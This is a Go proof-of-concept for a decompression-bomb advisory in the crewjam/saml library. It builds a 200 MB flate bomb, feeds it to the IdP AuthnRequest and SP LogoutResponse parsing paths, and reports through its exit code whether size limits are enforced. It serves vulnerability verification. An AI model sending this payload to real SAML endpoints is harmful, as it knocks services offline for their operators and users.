// PoC for SAML decompression bomb vulnerability (GHSA-5mqj-xc49-246p).
//
// The library uses flate.NewReader without a size limit, allowing a small
// compressed payload to expand into hundreds of megabytes on the server.
// This PoC tests both affected code paths:
//   - IdP AuthnRequest  (identity_provider.go – NewIdpAuthnRequest)
//   - SP LogoutResponse  (service_provider.go – ValidateLogoutResponseRedirect)
//
// Exit code 1 = vulnerability present, exit code 0 = vulnerability fixed.
package main

import (
	"bytes"
	"compress/flate"
	"encoding/base64"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"

	"github.com/crewjam/saml"
)

const bombSize = 200 * 1024 * 1024 // 200 MB uncompressed

// makeCompressedBomb returns a base64-encoded, flate-compressed blob of the
// given size filled with a single repeated byte.
func makeCompressedBomb(size int) string {
	data := bytes.Repeat([]byte("a"), size)
	var buf bytes.Buffer
	w, err := flate.NewWriter(&buf, flate.BestCompression)
	if err != nil {
		panic(err)
	}
	w.Write(data)
	w.Close()
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

// testIdPAuthnRequest tests the identity provider decompression path.
// Returns true when the vulnerability IS present (bomb processed), false otherwise.
func testIdPAuthnRequest() bool {
	fmt.Println("[Test 1] IdP AuthnRequest decompression bomb (identity_provider.go)")
	encoded := makeCompressedBomb(bombSize)
	req, _ := http.NewRequest("GET", "/?SAMLRequest="+url.QueryEscape(encoded), nil)

	idp := &saml.IdentityProvider{}
	_, err := saml.NewIdpAuthnRequest(idp, req)

	if err != nil {
		fmt.Printf("  PROTECTED: bomb rejected – %v\n", err)
		return false
	}
	fmt.Println("  VULNERABLE: bomb was decompressed without limit")
	return true
}

// testSPLogoutResponse tests the service provider decompression path.
// ValidateLogoutResponseRedirect expects raw base64-encoded data (not a query string).
// Returns true when the vulnerability IS present (bomb processed), false otherwise.
func testSPLogoutResponse() bool {
	fmt.Println("[Test 2] SP LogoutResponse decompression bomb (service_provider.go)")
	encoded := makeCompressedBomb(bombSize)

	sp := &saml.ServiceProvider{
		MetadataURL: mustParseURL("http://localhost/saml/metadata"),
		AcsURL:      mustParseURL("http://localhost/saml/acs"),
		IDPMetadata: &saml.EntityDescriptor{},
	}

	// ValidateLogoutResponseRedirect takes the raw base64-encoded value directly.
	err := sp.ValidateLogoutResponseRedirect(encoded)

	if err != nil {
		// Check PrivateErr for the specific decompression limit error.
		var ire *saml.InvalidResponseError
		if errors.As(err, &ire) && ire.PrivateErr != nil {
			privMsg := ire.PrivateErr.Error()
			if contains(privMsg, "uncompress limit exceeded") {
				fmt.Printf("  PROTECTED: decompression bomb blocked – %v\n", ire.PrivateErr)
				return false
			}
		}
		// Any other error after decompression (e.g., invalid XML) means the bomb
		// was fully decompressed into memory — the DoS already succeeded.
		fmt.Printf("  VULNERABLE: bomb was decompressed (subsequent error: %v)\n", err)
		return true
	}
	fmt.Println("  VULNERABLE: bomb was processed without error")
	return true
}

func contains(s, substr string) bool {
	return bytes.Contains([]byte(s), []byte(substr))
}

func mustParseURL(s string) url.URL {
	u, err := url.Parse(s)
	if err != nil {
		panic(err)
	}
	return *u
}

func main() {
	fmt.Println("=== SAML Decompression Bomb PoC ===")
	fmt.Println()

	vulnerable := false
	if testIdPAuthnRequest() {
		vulnerable = true
	}
	fmt.Println()
	if testSPLogoutResponse() {
		vulnerable = true
	}

	fmt.Println()
	if vulnerable {
		fmt.Println("RESULT: VULNERABLE – decompression bomb protection missing")
		os.Exit(1)
	}
	fmt.Println("RESULT: SAFE – decompression bombs properly rejected")
	os.Exit(0)
}
